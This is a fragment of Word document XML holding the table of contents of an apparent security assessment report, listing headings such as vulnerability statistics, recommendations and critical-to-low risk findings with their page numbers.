          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>1.6.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:iCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>ASSESSMENT STANDARD</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146492 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="380B9811" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00977C8B">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc34146493" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>1.7.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:iCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>VULNERABILITIES STATISTICS</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146493 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>2</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2FD582E4" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00977C8B">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc34146494" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>1.8.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:iCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>RECOMMENDATION</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146494 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>3</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2D0B3FF1" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00977C8B">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc34146495" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>2.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
            <w:color w:val="auto"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>TECHNICAL DETAIL REPORT</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146495 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>4</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="23A0D599" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00977C8B">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc34146496" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>2.1.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:iCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>CRITICAL RISK FINDINGS</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146496 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>4</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6C2F0846" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00977C8B">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc34146497" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>2.1.1.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ISSUE</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146497 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:t>4</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="635D6063" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00977C8B">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc34146498" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>2.2.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:iCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>HIGH RISK FINDINGS</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146498 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>4</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="104792A8" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00977C8B">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc34146499" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>2.2.1.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ISSUE</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146499 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:t>4</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="24D1DE98" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00977C8B">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc34146500" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>2.3.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:iCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>MEDIUM RISK FINDINGS</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146500 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>5</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="22554377" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00977C8B">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc34146501" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>2.3.1.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ISSUE</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146501 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:t>5</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3C09E254" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00977C8B">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:iCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc34146502" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>2.4.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:iCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>LOW RISK FINDINGS</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146502 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>6</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="623C8FE6" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00977C8B">
      <w:pPr>
        <w:pStyle w:val="TOC3"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc34146503" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>2.4.1.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ISSUE</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc34146503 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="002A4F04">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:t>6</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="48694D29" w14:textId="77777777" w:rsidR="004F330C" w:rsidRDefault="00977C8B">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc34146504" w:history="1">
        <w:r w:rsidR="004F330C" w:rsidRPr="00691C6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>3.</w:t>
        </w:r>
        <w:r w:rsidR="004F330C">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
